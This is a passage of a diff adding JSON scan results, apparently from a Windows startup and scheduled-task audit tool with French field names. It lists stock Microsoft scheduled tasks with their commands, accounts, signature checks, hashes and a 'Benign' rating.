+        "commande": "C:\\Program Files\\Microsoft Office\\root\\Office16\\sdxhelper.exe",
+        "signature": "Valid",
+        "sha256": "9a20c81bfcd9ad39be7d554203b3058b6ecf5716a4a0626f6099e92578ff1f1d"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Office\\Office Feature Updates Logon",
+      "target": "C:\\Program Files\\Microsoft Office\\root\\Office16\\sdxhelper.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft Office",
+        "commande": "C:\\Program Files\\Microsoft Office\\root\\Office16\\sdxhelper.exe /onlogon",
+        "signature": "Valid",
+        "sha256": "9a20c81bfcd9ad39be7d554203b3058b6ecf5716a4a0626f6099e92578ff1f1d"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Office\\Office Performance Monitor",
+      "target": "C:\\Program Files\\Microsoft Office\\root\\VFS\\ProgramFilesCommonX64\\Microsoft Shared\\Office16\\operfmon.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\Program Files\\Microsoft Office\\root\\VFS\\ProgramFilesCommonX64\\Microsoft Shared\\Office16\\operfmon.exe",
+        "signature": "Valid",
+        "sha256": "279b25be72566cd140fe5e4f8449b022dc16d24f11e551675157f347198d8ae7"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319",
+      "target": ".NET Framework NGEN v4.0.30319",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319 64",
+      "target": ".NET Framework NGEN v4.0.30319 64",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319 64 Critical",
+      "target": ".NET Framework NGEN v4.0.30319 64 Critical",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\.NET Framework\\.NET Framework NGEN v4.0.30319 Critical",
+      "target": ".NET Framework NGEN v4.0.30319 Critical",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\AccountHealth\\RecoverabilityToastTask",
+      "target": "RecoverabilityToastTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:06035dc5eb6d",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Active Directory Rights Management Services Client\\AD RMS Rights Policy Template Management (Automated)",
+      "target": "AD RMS Rights Policy Template Management (Automated)",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:f6d03e4eb3b5",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Active Directory Rights Management Services Client\\AD RMS Rights Policy Template Management (Manual)",
+      "target": "AD RMS Rights Policy Template Management (Manual)",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:f6d03e4eb3b5",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\AppID\\PolicyConverter",
+      "target": "C:\\WINDOWS\\system32\\appidpolicyconverter.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:dccbe27b1bdc",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\appidpolicyconverter.exe",
+        "signature": "Valid",
+        "sha256": "9bb061360f5fe625201299a63e698a55e22ab9d2bc6c12a48bcb189bedbf9839"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\AppID\\VerifiedPublisherCertStoreCheck",
+      "target": "C:\\WINDOWS\\system32\\appidcertstorecheck.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:9aa7cc4f7056",
+        "compte": "S-1-5-19",
+        "commande": "C:\\WINDOWS\\system32\\appidcertstorecheck.exe",
+        "signature": "Valid",
+        "sha256": "513605bce4c18fee8d117adee1051d23ae57a6f1e735606cd5254444daded088"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Application Experience\\MareBackup",
+      "target": "C:\\WINDOWS\\system32\\compattelrunner.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:fb32d128ef02",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\compattelrunner.exe -m:aeinv.dll -f:UpdateSoftwareInventoryW invsvc ; C:\\WINDOWS\\system32\\compattelrunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun ; C:\\WINDOWS\\system32\\compattelrunner.exe -m:aemarebackup.dll -f:BackupMareData",
+        "signature": "Valid",
+        "sha256": "02d5e7f9defec6b9a56a253d9983414cd69e7ecd0ba114c951ac9b3df04df3e6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser Exp",
+      "target": "C:\\WINDOWS\\system32\\compattelrunner.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:450b1a506bd8",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\compattelrunner.exe -m:appraiser.dll -f:DoScheduledTelemetryRun express",
+        "signature": "Valid",
+        "sha256": "02d5e7f9defec6b9a56a253d9983414cd69e7ecd0ba114c951ac9b3df04df3e6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Application Experience\\PcaPatchDbTask",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "Microsoft Corporation",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe %windir%\\system32\\PcaSvc.dll,PcaPatchSdbTask",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Application Experience\\SdbinstMergeDbTask",
+      "target": "C:\\WINDOWS\\system32\\sdbinst.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:b76754dd64e8",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\sdbinst.exe -mm",
+        "signature": "Valid",
+        "sha256": "421626f74f11eb323af424d56a7bb27a93d7afe7cb7043b747eb6bf580e409e6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Application Experience\\StartupAppTask",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:fd26fe4e688b",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe Startupscan.dll,SusRunTask",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ApplicationData\\appuriverifierdaily",
+      "target": "C:\\WINDOWS\\system32\\AppHostRegistrationVerifier.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:cef10eb68ff9",
+        "commande": "C:\\WINDOWS\\system32\\AppHostRegistrationVerifier.exe",
+        "signature": "Valid",
+        "sha256": "e81cd88c8f8bf4bd6ecd4e0982feb60480121b3369e46ee7e143ee6237dd117f"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ApplicationData\\appuriverifierinstall",
+      "target": "C:\\WINDOWS\\system32\\AppHostRegistrationVerifier.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:cef10eb68ff9",
+        "commande": "C:\\WINDOWS\\system32\\AppHostRegistrationVerifier.exe",
+        "signature": "Valid",
+        "sha256": "e81cd88c8f8bf4bd6ecd4e0982feb60480121b3369e46ee7e143ee6237dd117f"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ApplicationData\\CleanupTemporaryState",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:8e2b3251cd12",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe Windows.Storage.ApplicationData.dll,CleanupTemporaryState",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ApplicationData\\DsSvcCleanup",
+      "target": "C:\\WINDOWS\\system32\\dstokenclean.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:f6d963b2f50f",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\dstokenclean.exe",
+        "signature": "Valid",
+        "sha256": "38e4dbbe77423773545def4fedcad64357ea1db16b2f6617a4aaedae5da3c947"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\AppListBackup\\Backup",
+      "target": "Backup",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:02a12672c059",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\AppListBackup\\BackupNonMaintenance",
+      "target": "BackupNonMaintenance",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:02a12672c059",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\AppxDeploymentClient\\Pre-staged app cleanup",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe %windir%\\system32\\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Autochk\\Proxy",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:bb0496e5649c",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe /d acproxy.dll,PerformAutochkOperations",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\BitLocker\\BitLocker Encrypt All Drives",
+      "target": "BitLocker Encrypt All Drives",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\BitLocker\\BitLocker MDM policy Refresh",
+      "target": "BitLocker MDM policy Refresh",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Bluetooth\\UninstallDeviceTask",
+      "target": "C:\\WINDOWS\\system32\\BthUdTask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:5ba47dab3a96",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\BthUdTask.exe $(Arg0)",
+        "signature": "Valid",
+        "sha256": "73a5b2c12f246faa1beddc1e0c4c830dab010cf33cac3f0115dd4a13d636a4a6"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\BrokerInfrastructure\\BgTaskRegistrationMaintenanceTask",
+      "target": "BgTaskRegistrationMaintenanceTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:aa2904b64da8",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\capabilityaccessmanager\\maintenancetasks",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:baa4431831b0",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe %windir%\\system32\\CapabilityAccessManager.dll,CapabilityAccessManagerDoStoreMaintenance",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\CertificateServicesClient\\UserTask",
+      "target": "UserTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c4f7de6a0f4c",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\CertificateServicesClient\\UserTask-Roam",
+      "target": "UserTask-Roam",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:c4f7de6a0f4c",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Chkdsk\\ProactiveScan",
+      "target": "ProactiveScan",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:14c5fcee7ff8",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Chkdsk\\SyspartRepair",
+      "target": "C:\\WINDOWS\\system32\\bcdboot.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\bcdboot.exe %windir% /sysrepair",
+        "signature": "Valid",
+        "sha256": "7c924ed4f034ffdcb1feb83e684cd7d26ce4a754c30debb4935ef6a20ae62fdd"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\CloudExperienceHost\\CreateObjectTask",
+      "target": "CreateObjectTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\CloudRestore\\Backup",
+      "target": "Backup",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:0f77da15ef3a",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\CloudRestore\\Restore",
+      "target": "Restore",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:0f77da15ef3a",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\ConsentUX\\UnifiedConsent\\UnifiedConsentSyncTask",
+      "target": "UnifiedConsentSyncTask",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a3e0840493ae",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Containers\\CmCleanup",
+      "target": "CmCleanup",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:fadbf5bdcf73",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator",
+      "target": "C:\\WINDOWS\\System32\\wsqmcons.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:b99b43002db4",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\System32\\wsqmcons.exe",
+        "signature": "Valid",
+        "sha256": "8edba7ad9846ed8a5d09c284e324d1a12e62ad5b28f3d4b6a374671551a417c9"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Customer Experience Improvement Program\\UsbCeip",
+      "target": "UsbCeip",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:048100f06232",
+        "compte": "S-1-5-18",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Check And Scan",
+      "target": "Data Integrity Check And Scan",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:96498ec76b74",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Scan",
+      "target": "Data Integrity Scan",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:96498ec76b74",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Scan for Crash Recovery",
+      "target": "Data Integrity Scan for Crash Recovery",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:96498ec76b74",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag",
+      "target": "C:\\WINDOWS\\system32\\defrag.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a9bc9c4588dc",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\defrag.exe -c -h -o -$",
+        "signature": "Valid",
+        "sha256": "cb33deaaba36b887fa13cd2b29cdc1472241f815ece8bd2e78a307622d97e362"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Device Information\\Device",
+      "target": "C:\\WINDOWS\\system32\\devicecensus.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\devicecensus.exe SystemCxt",
+        "signature": "Valid",
+        "sha256": "8561e353a22f09136598b81939751052d6a59e4e34e250f79b1f9fe4bf98689e"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Device Information\\Device User",
+      "target": "C:\\WINDOWS\\system32\\devicecensus.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "commande": "C:\\WINDOWS\\system32\\devicecensus.exe UserCxt",
+        "signature": "Valid",
+        "sha256": "8561e353a22f09136598b81939751052d6a59e4e34e250f79b1f9fe4bf98689e"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Device Setup\\Driver Recovery on Reboot",
+      "target": "Driver Recovery on Reboot",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:886e670abecb",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Diagnosis\\RecommendedTroubleshootingScanner",
+      "target": "RecommendedTroubleshootingScanner",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:eb32cbd6af3c",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Diagnosis\\Scheduled",
+      "target": "Scheduled",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:a79150d37db4",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\Diagnosis\\UnexpectedCodepath",
+      "target": "C:\\WINDOWS\\system32\\UCConfigTask.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\UCConfigTask.exe",
+        "signature": "Valid",
+        "sha256": "83e2efaf90f761b2c43223f44ec243464ec012cf6c1a44620fe6414dbce7f8b9"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DirectX\\DirectXDatabaseUpdater",
+      "target": "C:\\WINDOWS\\system32\\directxdatabaseupdater.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\directxdatabaseupdater.exe",
+        "signature": "Valid",
+        "sha256": "caea9716b7a8b7fa4274e0376889828a2b8a4d75a756abab210db40721db8815"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DirectX\\DXGIAdapterCache",
+      "target": "C:\\WINDOWS\\system32\\dxgiadaptercache.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\dxgiadaptercache.exe",
+        "signature": "Valid",
+        "sha256": "6e53d9bddc31f9b83a8ee8477b16b882968f4a961d4607abca143754a5bc3304"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup",
+      "target": "C:\\WINDOWS\\system32\\cleanmgr.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:56ab225d4247",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\cleanmgr.exe /autocleanstoragesense /d %systemdrive%",
+        "signature": "Valid",
+        "sha256": "9700a8d3f6d66c2702f6240ac170859bbe13e4966429a5edb0543509a86afd92"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DiskDiagnostic\\Microsoft-Windows-DiskDiagnosticDataCollector",
+      "target": "C:\\WINDOWS\\system32\\rundll32.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "auteur": "anon:bc4fcfc06fa1",
+        "compte": "S-1-5-18",
+        "commande": "C:\\WINDOWS\\system32\\rundll32.exe dfdts.dll,DfdGetDefaultPolicyAndSMART",
+        "signature": "Valid",
+        "sha256": "5c066c0a800a0158180ca413148edf84033981010ca624f1637eab71475e3dd5"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DiskDiagnostic\\Microsoft-Windows-DiskDiagnosticResolver",
+      "target": "C:\\WINDOWS\\system32\\DFDWiz.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "d\u00E9sactiv\u00E9e",
+        "auteur": "anon:bc4fcfc06fa1",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\DFDWiz.exe",
+        "signature": "Valid",
+        "sha256": "211c577f2902087ad252982e90ac0f00c6712bd536fc99328e3572ae76263805"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DiskFootprint\\Diagnostics",
+      "target": "C:\\WINDOWS\\system32\\disksnapshot.exe",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "commande": "C:\\WINDOWS\\system32\\disksnapshot.exe -z",
+        "signature": "Valid",
+        "sha256": "e3efc11f128f6e10eae8e15c9aa100201aa89631377b8c9e4db1314dd46659f0"
+      }
+    },
+    {
+      "kind": "scheduled-task",
+      "source": "\\Microsoft\\Windows\\DiskFootprint\\StorageSense",
+      "target": "StorageSense",
+      "severity": "Benign",
+      "reasons": [],
+      "details": {
+        "\u00E9tat": "ready",
+        "compte": "S-1-5-18",
+        "\u00E9l\u00E9vation": "HighestAvailable",
+        "type": "ComHandler",
+        "note": "Action sans ex\u00E9cutable : aucune signature \u00E0 v\u00E9rifier."
+      }
+    },
+    {
